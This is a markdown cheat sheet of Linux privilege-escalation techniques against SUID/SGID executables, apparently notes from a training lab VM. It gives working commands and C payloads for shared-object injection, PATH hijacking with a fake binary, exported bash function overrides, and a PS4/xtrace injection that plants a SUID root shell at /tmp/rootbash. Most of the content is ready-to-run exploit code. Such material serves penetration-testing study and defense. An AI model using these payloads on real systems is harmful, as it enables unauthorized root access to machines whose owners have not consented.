# SUID / SGID Executables

## Known Exploits

- Find all the SUID/SGID executables on the Debian VM:

	```
	find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
	```
	
## Shared Object Injection

1. Run strace on the file and search the output for open/access calls and for "no such file" errors:

	```
	strace executable 2>&1 | grep -iE "open|access|no such file"
	```
	
2. Create a C file with the name of the shared object

	```
	#include <stdio.h>
	#include <stdlib.h>

	static void inject() __attribute__((constructor));

	void inject() {
		setuid(0);
		system("/bin/bash -p");
	}
	```
	
3. Compile
	
	```
	gcc -shared -fPIC -o <path-of-the-shared-object> <path-of-the-C-program>
	```
	
## Environment Variables

1. Run strings on the file to look for strings of printable characters:

	```
	strings /usr/local/bin/suid-env
	```

2. Look for executables that does not use the full path

3. Create a C file with the name of the program

	```
	int main() {
        setuid(0);
        system("/bin/bash -p");
	}
	```

4. Compile

	```
	gcc -o <program-used> <path-C-file>
	```

5. Prepend the current directory (or where the new executable is located) to the PATH variable, and run the executable to gain a root shell:

	```
	PATH=.:$PATH <path-executable>
	```
	
## Abusing Shell Features 

- ### Bash version < 4.2-048

1. Verify strings:

	```
	strings <program>
	```

2. Create a Bash function with the name of the executable that has the full path

	```
	function <executable> { /bin/bash -p; }  
	export -f <executable>
	```

- ### Bash version < 4.4 (Exemple)

	#### Info 
	
	 When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
	
	#### Steps
	
	1. Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
		
		```
		env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
		```

	2. Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
		
		```
		/tmp/rootbash -p
		```

	
